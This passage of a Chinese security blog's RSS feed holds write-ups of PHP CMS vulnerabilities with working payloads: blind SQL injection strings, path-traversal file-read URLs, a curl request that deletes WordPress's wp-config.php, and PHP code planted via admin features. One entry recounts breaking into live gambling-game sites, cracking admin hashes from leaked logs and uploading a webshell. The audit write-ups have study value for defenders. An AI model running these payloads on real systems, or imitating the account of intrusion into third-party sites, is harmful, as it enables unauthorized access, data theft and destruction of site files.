0x03 漏洞复现  首先在程序的后台添加一条数据  执行我们的payload,可以看到网站跳转延迟了3s以上。 url:http://sb.com/index.php?m=vod-search post:wd=))||if((select%0bascii(length((select(m_name)\`\`from(mac_manager))))=53),(\`sleep\`(3)),0)#%25%35%63  3. 因为是盲注所以注入出管理员的账号密码在下文分析。
0x04 SQL执行过程分析  先弄清楚sql是如何执行的一个过程，然后再去分析怎么会造成SQL注入的一个过程，这样对学习代码审计也是一个好处。 因为是动态分析，不会的安装调试环境的请到这篇文章按步骤完成安装https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/ phpstorm打开这个选项，意思就是断在当前脚本文件的第一行，我就不下断点了，跟着它执行的过程走一遍。  我们先随便输入一点数据 访问后会断在index.php的第一行  F8往下走，走到第14行F7跟进去。 然后F8一直往下走，可以看到拦截的规则 走到POST的过滤这里F7进去 arr_foreach函数检查传过来的值是否是数组，不是数组就返回原数据，然后用urldecode函数URL解码。 最后分别对传过来的wd和test两个值进行匹配，如果存在拦截规则里面的字符就跳转到错误信息。 比如你输入wd=/**/就会被拦截 因为/**/存在拦截的正则表达式里面。  走出来会到$m = be(&#39;get&#39;,&#39;m&#39;);这里，这里只是对m传过来的vod-search进行addslashes函数的过滤  我怕文章过长，一些不必要的代码自己去细读一遍就行了，F8一直往下周，走到37行F7进去，因为我们传过来的的参数是vod，所以会包含vod.php文件并执行。  因为我们传参是search所以会走到这里，我们可以F7进去看执行的过程。 在这里会经过urldecode函数的解码，一直循环到不能解码为止，然后经过刚才的StopAttack方法的过滤 最后到htmlEncode方法的替换  跳出到vod.php文件后F8走到这里，F7进去看SQL执行的过程。 一直走到markname的值是vod 然后不用管F8继续往下走，走到这里再F7进去 可以看到SQL执行是到这里，下面是执行的语句 SELECT count(*) FROM {pre}vod WHERE 1=1 AND d_hide=0 AND d_type&amp;gt;0 and d_type not in(0) and d_usergroup in(0) AND ( instr(d_name,&#39;test&#39;)&amp;gt;0 or instr(d_subname,&#39;test&#39;)&amp;gt;0 or instr(d_starring,&#39;test&#39;)&amp;gt;0 )    0x05 漏洞分析 上面分析了SQL执行过程，下面分析这个是如何构成SQL注入的。</description>
    </item>
    
    <item>
      <title>禅知Pro 1.6 前台任意文件读取分析</title>
      <link>https://getshe11.com/post/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis/</link>
      <pubDate>Sun, 19 Aug 2018 10:00:02 +0000</pubDate>
      
      <guid>https://getshe11.com/post/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis/</guid>
      <description>0x01 前言 这两天看到禅知这个CMS有一个前台的任意文件读取漏洞，就在此写一片分析文章。
0x02 环境  下载安装安装程序，这个CMS是封装起来的，连着Apache+MySQL一起打包成exe可执行程序。 安装也比较简单，傻瓜式安装。  0x03 漏洞复现  在网站根目录C:\xampp\chanzhi\www新建一个测试文件test.php  执行payload查看文件内容：http://localhost/file.php?pathname=../test.phpi&amp;amp;t=txt&amp;amp;o=source  执行payload来查看程序的配置文件：http://localhost/file.php?pathname=../http.ini&amp;amp;t=txt&amp;amp;o=source  跨目录读取文件（前提是有目录权限）：http://localhost/file.php?pathname=../../bin/php/backup.php&amp;amp;t=txt&amp;amp;o=source   0x04 漏洞分析 漏洞文件：C:\xampp\chanzhi\www\file.php,从头开始往下分析：
 1-19行是定义变量和判断是否GET传值过来，传全称或者简称都可以赋值给对应的变量，比如:http://192.168.86.130/file.php?f=../test.php&amp;amp;t=txt&amp;amp;o=source,pathname和f是对应的，下面的以此类推。 主要是19行，$_SERVER[&#39;SCRIPT_FILENAME&#39;]的值是C:/xampp/chanzhi/www/file.php,加上dirname函数后的值为C:/xampp/chanzhi/www。 rtrim函数是去掉/右边的值然后加上/data/之后$dataRoot的值为C:/xampp/chanzhi/www/data/  &amp;lt;?php $pathname = &amp;#39;&amp;#39;; $objectType = &amp;#39;&amp;#39;; $imageSize = &amp;#39;&amp;#39;; $extension = &amp;#39;&amp;#39;; $version = &amp;#39;&amp;#39;; if(isset($_GET[&amp;#39;pathname&amp;#39;])) $pathname = $_GET[&amp;#39;pathname&amp;#39;]; if(isset($_GET[&amp;#39;objectType&amp;#39;])) $objectType = $_GET[&amp;#39;objectType&amp;#39;]; if(isset($_GET[&amp;#39;imageSize&amp;#39;])) $imageSize = $_GET[&amp;#39;imageSize&amp;#39;]; if(isset($_GET[&amp;#39;extension&amp;#39;])) $extension = $_GET[&amp;#39;extension&amp;#39;]; if(isset($_GET[&amp;#39;f&amp;#39;])) $pathname = $_GET[&amp;#39;f&amp;#39;]; if(isset($_GET[&amp;#39;o&amp;#39;])) $objectType = $_GET[&amp;#39;o&amp;#39;]; if(isset($_GET[&amp;#39;s&amp;#39;])) $imageSize = $_GET[&amp;#39;s&amp;#39;]; if(isset($_GET[&amp;#39;t&amp;#39;])) $extension = $_GET[&amp;#39;t&amp;#39;]; if(isset($_GET[&amp;#39;v&amp;#39;])) $version = $_GET[&amp;#39;v&amp;#39;]; $dataRoot = rtrim(dirname($_SERVER[&amp;#39;SCRIPT_FILENAME&amp;#39;]), &amp;#39;/&amp;#39;) .</description>
    </item>
    
    <item>
      <title>CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)</title>
      <link>https://getshe11.com/post/cve-2018-1000094-cmsms-2.2.5-code-execution-vulnerability/</link>
      <pubDate>Sat, 11 Aug 2018 09:31:30 +0000</pubDate>
      
      <guid>https://getshe11.com/post/cve-2018-1000094-cmsms-2.2.5-code-execution-vulnerability/</guid>
      <description>0x01 前言 CMS Made Simple是一个简单易于使用的内容管理系统。它使用PHP，MySQL和Smarty模板引擎开发。
昨天看漏洞库的时候看到这一款CMS，漏洞操作也挺简单的，但是可以申请CVE，于是乎就复现了一篇过程和写漏洞脚本。
0x02 环境  下载下来是一个安装文件cmsms-2.2.5-install.php，浏览器直接打开  默认Next，到数据库连接这一块要先创建一个数据库，我这里创建一个名为simple的数据库，然后填上数据库连接信息  填写管理账号密码信息  填写可写可读的目录和选择语言  安装完成，除了邮件模块，不过也用不上。   0x03 漏洞复现过程  登录后台   选择File Manager   编写一个文件名为a.txt内容为&amp;lt;?php phpinfo();?&amp;gt;的文件，然后点击上传。   选中a.txt，点击copy,名字改为rce.php,然后确定   文件就copy过来了，有点类似系统的copy命令。   访问rce.php   0x04 漏洞分析过程  还记得上一篇的phpok的分析，如果找不出关键文件，可以抓包分析。 可以看到主要是通过文件admin/moduleinterface.php文件进行操作的。 可能这样看会让人很乱，我们可以用phpstorm的debug来调试整个过程 相关配置可以看https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/ 从上面的抓包可以看出来，mact参数是FileManager，m1_是fileaction，大家可以去这里下断点然后一步一步分析整个流程。  有经验可以看出来，FileManager就是modules\FileManager目录，fileaction就是modules/FileManager/action.fileaction.php文件，再往下看代码的68行，可以看到我们的copy操作的代码。  if (isset($params[&amp;#34;fileactioncopy&amp;#34;]) || $fileaction==&amp;#34;copy&amp;#34;) { include_once(__DIR__.&amp;#34;/action.copy.php&amp;#34;); return; }  我们找到这个文件action.copy.php，我们在93行下一个断点，然后去操作copy，可以看到有各种很详细的参数信息。  我们F7单步走，可以看到执行$res = copy($src,$dest);的时候没有发生错误。  这样就正式完成了所有操作，如有不懂可以看下官方文档的copy函数的用法http://www.php.net/manual/en/function.copy.php  0x05 漏洞脚本 python版本 # Exploit Title: CMS Made Simple 2.</description>
    </item>
    
    <item>
      <title>phpok4.9后台getshell(每周一洞)</title>
      <link>https://getshe11.com/post/phpok4.9-background-getshell/</link>
      <pubDate>Mon, 06 Aug 2018 08:19:40 +0000</pubDate>
      
      <guid>https://getshe11.com/post/phpok4.9-background-getshell/</guid>
      <description>0x01 前言 昨天看到phpok可以申请cve就去审计了一下，存在漏洞的地方还是挺多的，时间不多找了个简单的任意文件上传漏洞。
0x02 环境  程序下载：https://www.lanzous.com/i1ksjkd 集成环境是PHPstudy,PHP5.6。 安装程序   4. 先创建一个数据库phpok 5. 设置管理员账号密码 6. 安装成功 0x03 漏洞挖掘过程   打开打开FolderChangesView记录程序的文件变动。   登录后台 程序升级-&amp;gt;压缩包升级   编辑一个测试文件phpinfo.php,压缩为phpinfo.zip上传。   点击上传，压缩包里面的文件会被压缩到网站根目录   访问根目录下新生成的文件   0x04 漏洞分析 漏洞代码出现在framework/admin/update_control.php文件的unzip_f函数,可以看到用到lib里面的phpzip类，有兴趣可以去读下源码framework/libs/phpzip.php 大家可能疑问你怎么知道漏洞文件是这个，可以抓包来查看整过利用的过程，然后再去源码分析。 public function unzip_f() { $zipfile = $this-&amp;gt;get(&amp;#39;zipfile&amp;#39;); if(!$zipfile){ $this-&amp;gt;error(P_Lang(&amp;#39;未指定附件文件&amp;#39;)); } if(strpos($zipfile,&amp;#39;..&amp;#39;) !== false){ $this-&amp;gt;error(P_Lang(&amp;#39;不支持带..上级路径&amp;#39;)); } if(!file_exists($this-&amp;gt;dir_root.$zipfile)){ $this-&amp;gt;error(P_Lang(&amp;#39;ZIP文件不存在&amp;#39;)); } $this-&amp;gt;lib(&amp;#39;phpzip&amp;#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,&amp;#39;data/update/&amp;#39;); $info = $this-&amp;gt;update_load(); if(!$info || (is_array($info) &amp;amp;&amp;amp; $info[&amp;#39;status&amp;#39;] == &amp;#39;error&amp;#39;)){ $this-&amp;gt;error($info[&amp;#39;content&amp;#39;]); } $this-&amp;gt;success(); } 可以看到用到lib里面的phpzip类，有兴趣可以去读下源码framework/libs/phpzip.</description>
    </item>
    
    <item>
      <title>phpok 4.9代码审计(每周一洞)</title>
      <link>https://getshe11.com/post/phpok-4.9-code-audit/</link>
      <pubDate>Sun, 05 Aug 2018 14:54:07 +0000</pubDate>
      
      <guid>https://getshe11.com/post/phpok-4.9-code-audit/</guid>
      <description>0x01 前言 一放暑假就特别多事情，很多事情都耽误了，看吐司文章看到一篇不错的审计文章，就学习下。
0x02 环境搭建 环境没什么要求PHPstudy就能搞定，这个要先创建数据库再安装程序的。
0x03 任意文件上传漏洞 漏洞复现  登录后台，点击模块管理   新建一个测试文件然后压缩  然后导入模块 可以看到已经上传到了/data/cache/的目录下面了：  访问文件   漏洞分析 漏洞代码在framework/admin/modulec_control.php 642行。 大家可以详细的分析这个流程，主要漏洞的代码是 $this-&amp;gt;lib(&#39;phpzip&#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,$this-&amp;gt;dir_root.&#39;data/cache/&#39;); 没有做任何的过滤，直接把zip原样解压缩到/data/cache/的目录下面。
/** * 模块导入 * @变量 zipfile 指定的ZIP文件地址 **/ public function import_f() { $zipfile = $this-&amp;gt;get(&amp;#39;zipfile&amp;#39;); if(!$zipfile){ $this-&amp;gt;lib(&amp;#39;form&amp;#39;)-&amp;gt;cssjs(array(&amp;#39;form_type&amp;#39;=&amp;gt;&amp;#39;upload&amp;#39;)); $this-&amp;gt;addjs(&amp;#39;js/webuploader/admin.upload.js&amp;#39;); $this-&amp;gt;view(&amp;#39;module_import&amp;#39;); } if(strpos($zipfile,&amp;#39;..&amp;#39;) !== false){ $this-&amp;gt;error(P_Lang(&amp;#39;不支持带..上级路径&amp;#39;)); } if(!file_exists($this-&amp;gt;dir_root.$zipfile)){ $this-&amp;gt;error(P_Lang(&amp;#39;ZIP文件不存在&amp;#39;)); } $this-&amp;gt;lib(&amp;#39;phpzip&amp;#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,$this-&amp;gt;dir_root.&amp;#39;data/cache/&amp;#39;); if(!file_exists($this-&amp;gt;dir_root.&amp;#39;data/cache/module.xml&amp;#39;)){ $this-&amp;gt;error(P_Lang(&amp;#39;导入模块失败，请检查解压缩是否成功&amp;#39;)); } $rs = $info = $this-&amp;gt;lib(&amp;#39;xml&amp;#39;)-&amp;gt;read($this-&amp;gt;dir_root.&amp;#39;data/cache/module.xml&amp;#39;,true); if(!$rs){ $this-&amp;gt;error(P_Lang(&amp;#39;XML内容解析异常&amp;#39;)); } $tmp = $rs; if(isset($tmp[&amp;#39;_fields&amp;#39;])){ unset($tmp[&amp;#39;_fields&amp;#39;]); } $insert_id = $this-&amp;gt;model(&amp;#39;module&amp;#39;)-&amp;gt;save($tmp); if(!</description>
    </item>
    
    <item>
      <title>DedeCMS V5.7后台过滤不当导致Getshell(每周一洞)</title>
      <link>https://getshe11.com/post/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</link>
      <pubDate>Fri, 27 Jul 2018 14:14:56 +0000</pubDate>
      
      <guid>https://getshe11.com/post/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</guid>
      <description>0x01 前言 前两天看到七月火表哥再先知发的一篇审计文章，感觉不错，是dedecms的getshell。就分析了一下，顺便写一篇文章学习。
0x02 环境 环境和之前的一篇文章一样可以作为参考： https://getpass.cn/2018/03/10/DedeCMS%20V5.7%20SP2%20Background%20Getshell%20Code%20Execution%20Vulnerability/
0x03 复现漏洞  进入后台添加广告的地方：http://sb.com/dede/ad_main.php 在添加页面加上我们的代码：--&amp;gt;&amp;lt;?php phpinfo();?&amp;gt;&amp;lt;!--  然后点击查看代码  访问执行代码   0x04 漏洞分析 dede\ad_add.php,代码可以读一遍，插入数据库的时候并没有对危险函数进行处理。
if($dopost==&amp;#34;save&amp;#34;) { csrf_check(); //timeset tagname typeid normbody expbody  $tagname = trim($tagname); $row = $dsql-&amp;gt;GetOne(&amp;#34;SELECT typeid FROM #@__myad WHERE typeid=&amp;#39;$typeid&amp;#39; AND tagname LIKE &amp;#39;$tagname&amp;#39;&amp;#34;); if(is_array($row)) { ShowMsg(&amp;#34;在相同栏目下已经存在同名的标记！&amp;#34;,&amp;#34;-1&amp;#34;); exit(); } $starttime = GetMkTime($starttime); $endtime = GetMkTime($endtime); $link = addslashes($normbody[&amp;#39;link&amp;#39;]); if($normbody[&amp;#39;style&amp;#39;]==&amp;#39;code&amp;#39;) { $normbody = addslashes($normbody[&amp;#39;htmlcode&amp;#39;]); } else if($normbody[&amp;#39;style&amp;#39;]==&amp;#39;txt&amp;#39;) { $normbody = &amp;#34;&amp;lt;a href=\&amp;#34;{$link}\&amp;#34;font-size=\&amp;#34;{$normbody[&amp;#39;size&amp;#39;]}\&amp;#34;color=\&amp;#34;{$normbody[&amp;#39;color&amp;#39;]}\&amp;#34;&amp;gt;{$normbody[&amp;#39;title&amp;#39;]}&amp;lt;/a&amp;gt;&amp;#34;; } else if($normbody[&amp;#39;style&amp;#39;]==&amp;#39;img&amp;#39;) { if(empty($normbody[&amp;#39;width&amp;#39;])) { $width = &amp;#34;&amp;#34;; } else { $width = &amp;#34; width=\&amp;#34;{$normbody[&amp;#39;width&amp;#39;]}\&amp;#34;&amp;#34;; } if (empty($normbody[&amp;#39;height&amp;#39;])) { $height = &amp;#34;&amp;#34;; } else { $height = &amp;#34;height=\&amp;#34;{$normbody[&amp;#39;height&amp;#39;]}\&amp;#34;&amp;#34;; } $normbody = &amp;#34;&amp;lt;a href=\&amp;#34;{$link}\&amp;#34;&amp;gt;&amp;lt;img src=\&amp;#34;{$normbody[&amp;#39;url&amp;#39;]}\&amp;#34;$width$heightborder=\&amp;#34;0\&amp;#34;/&amp;gt;&amp;lt;/a&amp;gt;&amp;#34;; } else { if(empty($normbody[&amp;#39;width&amp;#39;])) { $width = &amp;#34;&amp;#34;; } else { $width = &amp;#34; width=\&amp;#34;{$normbody[&amp;#39;width&amp;#39;]}\&amp;#34;&amp;#34;; } if (empty($normbody[&amp;#39;height&amp;#39;])) { $height = &amp;#34;&amp;#34;; } else { $height = &amp;#34;height=\&amp;#34;{$normbody[&amp;#39;height&amp;#39;]}\&amp;#34;&amp;#34;; } $normbody = &amp;#34;&amp;lt;object classid=\&amp;#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\&amp;#34;codebase=\&amp;#34;http://download.</description>
    </item>
    
    <item>
      <title>HDWiki v6.0最新版referer注入漏洞(每周一洞)</title>
      <link>https://getshe11.com/post/hdwiki-v6.0_latest_version_of_referer_injection_vulnerability/</link>
      <pubDate>Sun, 22 Jul 2018 17:13:30 +0000</pubDate>
      
      <guid>https://getshe11.com/post/hdwiki-v6.0_latest_version_of_referer_injection_vulnerability/</guid>
      <description>0x01 前言 经拖稿一个月了，差了四篇文章没补回来， 现在都补上，虽然说这样没有坚持的按时写下去，但是只要记得要做这个事情就行了，不能中途而废。这个漏洞比较鸡肋，搁现在估计都没戏了，但是这个漏洞的思路可以学习下，积累经验。
0x02 环境搭建 6.0可以在官网下载：http://kaiyuan.hudong.com/download/ 在文章底部也会附上源码，搭建就不详细说明了，在我的其他文章也有搭建的详细步骤。用到的集成环境是PHPstudy，PHP版本是5.3，开启GPC。
0x03 漏洞利用 1. 注册账号 http://sb.com/index.php?user-register
2. 截获数据包 http://sb.com/index.php?user-login, 用burp或者其他工具截取数据包。
3. 执行Payload 在数据包下面加上referer：referer:&#39; where if((substr((select password from wiki_user where username=&#39;admin&#39;),1,1))=&#39;e&#39;,sleep(5),0)# 看到burp的右下角时间比没有加上payload的时候多了5s，证明漏洞利用成功。
0x04 漏洞分析 文件control/user.php的110行dologin()函数，为什么要登录用户才有效呢，因为$_ENV[&#39;user&#39;]这里检测了cookies，所以没有用户登录是不能执行不成功的。想了解的可以进去读一下这个代码，主要存在注入的地方是在$_ENV[&#39;user&#39;]-&amp;gt;add_referer();这里。
function dologin(){ $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_server(&amp;#39;login&amp;#39;,&amp;#39;1&amp;#39;); if(!isset($this-&amp;gt;post[&amp;#39;submit&amp;#39;])){ $this-&amp;gt;view-&amp;gt;assign(&amp;#39;checkcode&amp;#39;,isset($this-&amp;gt;setting[&amp;#39;checkcode&amp;#39;])?$this-&amp;gt;setting[&amp;#39;checkcode&amp;#39;]:0); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;add_referer(); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_server(&amp;#39;login&amp;#39;,&amp;#39;2&amp;#39;); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_client(&amp;#39;login&amp;#39;); if (!isset($this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;])) {$this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;] = 3;} if (!isset($this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;])) {$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;] = 15;} $loginTip2 = str_replace(array(&amp;#39;3&amp;#39;,&amp;#39;15&amp;#39;),array($this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;],$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;]),$this-&amp;gt;view-&amp;gt;lang[&amp;#39;loginTip2&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;name_min_length&amp;#39;,$this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;name_max_length&amp;#39;,$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;loginTip2&amp;#39;,$loginTip2); //$this-&amp;gt;view-&amp;gt;display(&amp;#39;login&amp;#39;); 	$_ENV[&amp;#39;block&amp;#39;]-&amp;gt;view(&amp;#39;login&amp;#39;); }else{ 继续跟进add_referer()函数的分析，model\user.class.php的41行，这里判断了HTTP_REFERER是否为真然后执行下面内容，可以看到把$_SERVER[&#39;HTTP_REFERER&#39;]带入UPDATE语句，但是有一个haddslashes函数的过滤。
function add_referer(){ if($_SERVER[&amp;#39;HTTP_REFERER&amp;#39;]){ $this-&amp;gt;db-&amp;gt;query(&amp;#34;UPDATE &amp;#34;.DB_TABLEPRE.&amp;#34;session SET referer =&amp;#39;&amp;#34;.string::haddslashes($_SERVER[&amp;#39;HTTP_REFERER&amp;#39;]).&amp;#34;&amp;#39; WHERE sid=&amp;#39;&amp;#34;.base::hgetcookie(&amp;#39;sid&amp;#39;).&amp;#34;&amp;#39;&amp;#34;); } } 我们进入haddslashes()函数，在lib\string.</description>
    </item>
    
    <item>
      <title>Wordpress 4.9.6 Arbitrary File-Removal Vulnerability</title>
      <link>https://getshe11.com/post/wordpress-4.9.6-arbitrary-file-removal-vulnerability/</link>
      <pubDate>Sun, 01 Jul 2018 10:07:19 +0000</pubDate>
      
      <guid>https://getshe11.com/post/wordpress-4.9.6-arbitrary-file-removal-vulnerability/</guid>
      <description>0x01 前言 和预期超了几天，毕业了挺多聚会的，在学校的日子总是过得那么快，一转眼就毕业了。好些东西都没去好好珍惜，大学也不要求有多大的成就，就希望每天都能开开心心就最好的。 今天这篇文章的分析早就有人发过了，不过我觉得我还是得写一下，毕竟我要有我自己的风格。还是老样子，先测试漏洞怎么触发，然后再去做分析。
0x02 环境搭建 旧的和新的区别不大，只要不大于4.9.6就行了，这次测试的是4.6版本的，具体怎么搭建按照上一篇的文章方法搭建就行了，这里就不再过一遍了。 https://getpass.cn/2018/06/18/Analysis-of-WordPress%3C=4.6-Command-Execution-Vulnerability/
本文中用的搭建环境是docker+Kitematic，都差不多的，用图形界面比较方便些。 0x03 漏洞复现 1.漏洞执行流程 先给一个大概的框架，代码稍后再分析就会很明了了。 2.复现过程 -登录账号 -上传文件 -编辑文件 -执行Payload 首先要获取_wpnonce和cookies还有post的id。 然后执行： curl -v &#39;http://127.0.0.1/wp-admin/post.php?post=5&#39; -H &#39;Cookie: xxx&#39; -d &#39;action=editattachment&amp;amp;_wpnonce=xxx&amp;amp;thumb=../../../../wp-config.php&#39; 我这里用的是curl，在Macos比较方便，如果是win可以用抓包发包。 -删除文件 然后点击删除 执行完之后会跳转到安装界面。 然后wp-config.php也不在网站目录下了 0x04 漏洞分析 1.phpmyadmin安装 在命令行里面看数据不太好看，装个图形界面比较清楚，进入docker的交互式： 查看容器ID docker ps 进入指定容器的交互式 docker exec -it ID /bin/bash 安装phpmyadmin,输入下面的命令就行了： apt update apt install phpmyadmin 然后输入MySQL的账号密码，再创建链接： ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin 最后输入 htpp://127.0.0.1/phpmyadmin进入
2.分析如何插入thumb属性 我们看下Payload里面是传了什么参数：
 post action thumb  post传入的ID就不分析了，直接看action的参数的值是editattachment,代码是在/wp-admin/post.php的178~189行
case &amp;#39;editattachment&amp;#39;: check_admin_referer(&amp;#39;update-post_&amp;#39; .</description>
    </item>
    
    <item>
      <title>WordPress 4.6 Command Execution Vulnerability(CVE-2016-10033) Analysis</title>
      <link>https://getshe11.com/post/analysis-of-wordpress4.6-command-execution-vulnerability/</link>
      <pubDate>Mon, 18 Jun 2018 12:47:35 +0000</pubDate>
      
      <guid>https://getshe11.com/post/analysis-of-wordpress4.6-command-execution-vulnerability/</guid>
      <description>0x01 前言 因为去参加比赛，已经有一个月没有写文章了，中间玩了段时间，现在把心收回来了，坚持每周一洞的习惯。废话不多说，下面是复现PHPMailer的详细过程，一步一步来理解这个漏洞的原理。
0x02 Roundcube 1.2.2 远程命令执行漏洞分析 1.触发漏洞需满足前提  Roundcube 使用 PHP 的 mail 来发送邮件，而不通过其他 SMTP Server PHP 的 mail 使用 sendmail 来发送邮件（默认） PHP 的 safe_mode 是关闭的（默认） 攻击者需要知道 Web 应用的绝对路径 攻击者可以登录到 Roundcube 并可以发送邮件 成功攻击后攻击者可远程执行任意代码。  2.代码分析 具体可以在下面的参考的文章链接详细阅读，我直接抽文件program/lib/Roundcube/rcube.php第1524-1678行：
$from参数进入mail()函数处理，通过使用-f参数获取from来传递给sendmail。
public function deliver_message(&amp;amp;$message, $from, $mailto, &amp;amp;$error, &amp;amp;$body_file = null, $options = null) { // send thru SMTP server using custom SMTP library  if ($this-&amp;gt;config-&amp;gt;get(&amp;#39;smtp_server&amp;#39;)) { ... } // send mail using PHP&amp;#39;s mail() function  else { .</description>
    </item>
    
    <item>
      <title>H5神兽棋牌游戏渗透之旅</title>
      <link>https://getshe11.com/post/h5-beast-game-penetration-journey/</link>
      <pubDate>Fri, 11 May 2018 22:14:47 +0000</pubDate>
      
      <guid>https://getshe11.com/post/h5-beast-game-penetration-journey/</guid>
      <description>0x01 前言 本来不想发的，涉及太多利益了,这些棋牌游戏的源码最高能卖到几万。开发起来不比一个商场程序难。 最近又太忙了，没时间去做代码审计的文章了，但一不小心又抢了个运气王。。。
0x02 开始 一天做这行的朋友来找我，说帮审计下一套程序，正好这边的缺一篇文章就顺便去看看了。 开始看了下目录，找了几个用这套源码的平台来测试,看了下里面的功能。
这套源码用的框架是基于Thinkphp3.2的Thinkcmf的，现在的Thinkcmf已经更新到了基于Thinkphp5.0了，之前没做过H5的代码审计，看到现在H5发展很快，基本都可以抛弃flash了。 0x03 后台入口 后台路径没改，直接输入admin就进去了，有些后台是要后面接认证码的，不过也可以进去的，等会看日志就懂了。 这里做了验证码的判断，懒得去爆破了。 0x04 日志文件泄露 翻了下t00ls关于thinkcmf的漏洞，有个日志的可以查看到sql执行的记录。日志存放的位置 访问路径data/runtime/Logs/Admin/18_05_09.log，后面接上的是年月日。 我们来找一下管理员的账号密码，cmf的加密方式为两种，现在这款用的是###+两次MD5加密(认证码+密码) 我们从日志找到的SQL执行日志 解密可以去https://cmd5.la/ss/ 或者直接写脚本跑，一般认证码都是不变的，只要跑后面的密码就行了。 搞到账号密码直接登录后台进行拿shell的过程了。 0x05 Getshell 本来想在后台的配置文件里面写shell进去的 后来朋友直接扔了一个编辑器过来，地址：index.php/Portal/AdminPage/add 因为有后台权限，直接访问index.php/Admin/Setting/upload修改允许上传的后缀 然后写了一个一句话上传，用C刀连接，大功告成！ 0x06 结束 这种棋牌游戏前段时间是相当的火，这个只是一个台子的帐，其他的还不晓得有多暴利。 </description>
    </item>
    
    <item>
      <title>CentOS 5.x 安装Python3和yum源配置</title>
      <link>https://getshe11.com/post/centos-5.x-yum-source-configuration/</link>
      <pubDate>Mon, 07 May 2018 16:15:13 +0000</pubDate>
      
      <guid>https://getshe11.com/post/centos-5.x-yum-source-configuration/</guid>
      <description>0x01 前言 技能大赛的题目里面用的是CentOS的系统，本来觉得没什么，居然要装上Python3的版本，尝试了各种办法去下载python. 中间用了curl 和 wget的下载方式，提示，说不能建立SSL，办法就是更新wget这个工具，我想我还是自己下载吧。 然而浏览器也是
0x02 源代码安装Python3 下载Python3软件包 老系统就安装那么新的版本了，就选择了一个3.5的，在实体机下载的，因为浏览器也不支持ssl，只能在实体机下载了软件包然后拉到虚拟机里面。 下载地址：https://www.python.org/downloads/release/python-355/ 把文件放到用户的主目录，然后切换到root。 安装Python3 先解压
tar zxvf Python-3.5.4.tgz 然后进入
cd Python-3.5.4 编译安装
./configure prefix=/usr/local/python3 make &amp;amp;&amp;amp; make install 这里需要等一段时间，安装好之后，因为CentOS原本就自带了Python2的版本，所以我们可以软链到/usr/bin的目录下，并改名为python3。
ln -s /usr/local/python3/bin/python3 /usr/bin/python3 安装完成后 0x03 配置yum源 但是很多库文件要下载，pip也要安装，网上都是用yum安装pip的，所以只得更新下yum源了。 我开始是去百度找的，但是那些都过期了，就去官网找。 http://mirror.centos.org/centos/5.5/readme 里面只有一个readme,内容是
 This directory (and version of CentOS) is deprecated. For normal users, you should use /5/ and not /5.5/ in your path. Please see this FAQ concerning the CentOS release scheme: https://wiki.</description>
    </item>
    
    <item>
      <title>用Vulnhub来练习漏洞靶场(爸爸再也不用担心我没有靶场练习了)</title>
      <link>https://getshe11.com/post/use-vulnhub-to-build-a-variety-of-hole-shooting-range-father-no-longer-have-to-worry-about-i-have-no-practice-range/</link>
      <pubDate>Thu, 03 May 2018 17:04:29 +0000</pubDate>
      
      <guid>https://getshe11.com/post/use-vulnhub-to-build-a-variety-of-hole-shooting-range-father-no-longer-have-to-worry-about-i-have-no-practice-range/</guid>
      <description>0x01 前言 Vulnhub它是一个提供各种漏洞环境的平台，里面大部分的环境是要用VMware或者VirtualBox打开运行的。 如果只是练习一些常见的漏洞可以看我另一篇用[Docker来搭建各种漏洞靶场(妈妈再也不用担心我没有靶场练习了)](https://getpass.cn/2018/03/14/Use Docker to build a variety of loopholes (my mother no longer has to worry about not having practiced in the shooting range)/)
0x02 下载 https://www.vulnhub.com 里面有各种各样的镜像，可以下载到自己的机子上面练习。 镜像的下载地址和描述、难度等级等 随便点击下载，有些需要FQ才能下载，推荐官网的下载地址。 作为测试，我就下载JIS-CTF: VulnUpload作为演示吧
Download (Mirror): https://download.vulnhub.com/jisctf/JIS-CTF-VulnUpload-CTF01.ova
0x03 安装 下载完后，解压出来，会看到一个ovf后缀的文件 打开VMware，点击打开，找到我们刚才解压的文件，选择ovf文件 选择存放的位置，然后点击导入 最后等待导入完成，导入速度看本机性能和镜像的大小 0x04 设置 导入完成后，我设置的网络模式是NAT的，因为我内网比较多机子，所以选择这个方便等下扫描。还有就是内存大小，如果本机内存小于4G的请修改内存到4G以下。 我们点击开启虚拟机，到开机的页面我们回车选择第二个Ubuntu的高级选项（如果启动有网络正常的话可以直接正常开机，如果网络不正常可以按下面步骤操作） 进到高级选项，我们再次回车选择第二个Linux内核版本的恢复模式 等待系统启动完毕后，看到这个页面，我们继续回车进入 回车后会弹出选择界面，我们选择root一行回车，然后再次回车进入命令行模式 输入命令查看所以的网卡：ifconfig -a 我的是ens33，然后继续输入命令 vi /etc/network/interface修改网络配置文件 修改这两个地方，改成你的网卡名称，然后ctrl+x保存，最后输入reboot重启，OK！ 0x05 完成任务吧！ 作者给的描述是要我们找到靶机里面的5个flag
 Description: There are five flags on this machine. Try to find them.</description>
    </item>
    
    <item>
      <title>Thinkphp框架 3.2.x sql注入漏洞分析(每周一洞)</title>
